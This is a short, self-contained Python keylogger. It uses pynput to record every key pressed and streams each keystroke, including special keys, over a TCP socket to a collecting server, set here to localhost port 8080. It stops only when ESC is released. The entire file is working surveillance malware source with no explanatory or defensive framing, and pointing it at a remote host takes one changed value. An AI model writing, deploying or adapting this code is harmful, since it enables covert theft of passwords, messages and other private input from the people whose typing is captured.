import socket
from pynput.keyboard import Key, Listener

# Set up server connection
server_ip = 'localhost'
server_port = 8080

# Create a socket object
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((server_ip, server_port))

# Function to send keystrokes to the server
def send_key_to_server(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            client_socket.send(f"Key pressed: {key.char}".encode())
        else:
            client_socket.send(f"Special key pressed: {key}".encode())
    except Exception as e:
        print(f"Error sending key: {e}")

# Function to handle key press events
def on_press(key):
    send_key_to_server(key)

# Function to stop listener when ESC key is pressed
def on_release(key):
    if key == Key.esc:
        client_socket.close()  # Close the connection to the server
        return False

# Start listener to capture key events and send them to the server
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
